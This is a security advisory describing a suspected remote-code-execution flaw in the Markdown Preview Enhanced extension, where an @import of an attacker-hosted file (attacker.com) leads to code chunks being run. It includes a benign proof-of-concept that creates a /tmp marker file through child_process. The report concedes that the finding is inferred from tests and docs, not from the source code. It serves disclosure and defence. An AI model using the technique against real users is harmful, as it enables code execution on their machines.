### Vulnerability List

- Vulnerability name: Code Injection via File Imports and Code Chunks
- Description:
    1. An attacker crafts a malicious markdown file (`malicious.md`) containing a code chunk that executes arbitrary commands.
    2. The attacker hosts this `malicious.md` file on a publicly accessible server or tricks a user into placing it locally.
    3. The victim opens a legitimate markdown file using Markdown Preview Enhanced.
    4. In the legitimate markdown file, the victim includes a file import statement that points to the attacker's `malicious.md` file, for example using `@import "http://attacker.com/malicious.md"` or `@import "./malicious.md"`.
    5. When the Markdown Preview Enhanced extension processes the legitimate markdown file, it fetches and includes the content of `malicious.md`.
    6. The code chunk in `malicious.md` is then executed by the extension during the preview generation, leading to code injection.
- Impact: Remote Code Execution (RCE) on the machine where the Markdown Preview Enhanced extension is running. The attacker can potentially gain full control of the victim's system, steal sensitive data, or perform other malicious actions.
- Vulnerability rank: critical
- Currently implemented mitigations: None identified in the provided project files.
- Missing mitigations:
    - Input sanitization and validation for file paths in `@import` statements to prevent importing from arbitrary remote URLs or unexpected local paths.
    - Sandboxing or isolation for code chunk execution to limit the privileges and access of executed code.
    - User confirmation or warning before executing code chunks, especially when imported from external sources.
    - Content Security Policy (CSP) to restrict the capabilities of the preview window and prevent execution of arbitrary scripts.
- Preconditions:
    - The victim must have the Markdown Preview Enhanced extension installed in VS Code or VS Code for the Web.
    - The victim must open a markdown file using Markdown Preview Enhanced.
    - The opened markdown file must contain an `@import` statement that points to a malicious markdown file controlled by the attacker.
    - Code chunk execution feature of Markdown Preview Enhanced must be enabled.
- Source code analysis:
    - Due to the absence of the core extension source code in the PROJECT FILES, a detailed code-level analysis is not feasible. However, analyzing the provided test files and documentation, the following can be inferred:
        - The extension supports `@import` syntax to include external files into markdown documents, as demonstrated in `/code/test/markdown/file-imports.md` and described in `README.md`.
        - The extension executes code chunks embedded in markdown documents, as shown in `/code/test/markdown/code-chunks.md` and `README.md`.
        - If the `@import` functionality naively includes the content of a remote or local file without proper sanitization, and if the code chunk execution engine processes and executes code chunks within the imported content without sandboxing, then a code injection vulnerability is highly likely.
        - The extension's features of file import and code chunk execution, while powerful, can be exploited if not implemented with robust security measures.
- Security test case:
    1. Attacker setup:
        - Create a file named `malicious.md` with the following markdown content:
          ```markdown
          # Malicious Markdown File

          This file contains a malicious code chunk.

          \`\`\`javascript {cmd=node}
          // Malicious code to create a marker file in /tmp directory
          require('child_process').execSync('touch /tmp/markdown_preview_enhanced_pwned');
          console.log('Malicious code executed!');
          \`\`\`
          ```
        - Host `malicious.md` on a publicly accessible web server. For example, using `python3 -m http.server 8000` in the directory containing `malicious.md` and accessing it via `http://localhost:8000/malicious.md`.
    2. Victim actions:
        - Open VS Code or VS Code for the Web with Markdown Preview Enhanced extension installed.
        - Create a new markdown file named `legitimate.md` or open an existing one.
        - Add the following line to `legitimate.md` to import the malicious file:
          ```markdown
          @import "http://localhost:8000/malicious.md"
          ```
          (If testing against a remote server, replace `http://localhost:8000/malicious.md` with the actual URL of the hosted `malicious.md` file).
        - Open the preview of `legitimate.md` using Markdown Preview Enhanced (`Ctrl+Shift+V` or `Cmd+Shift+V`).
        - After the preview is rendered, check if a file named `markdown_preview_enhanced_pwned` exists in the `/tmp/` directory of the victim's system.
    3. Expected result: If the vulnerability is present, the malicious JavaScript code chunk from `malicious.md` will be executed when `legitimate.md` is previewed. This execution will result in the creation of the `markdown_preview_enhanced_pwned` file in the `/tmp/` directory, confirming successful Remote Code Execution.
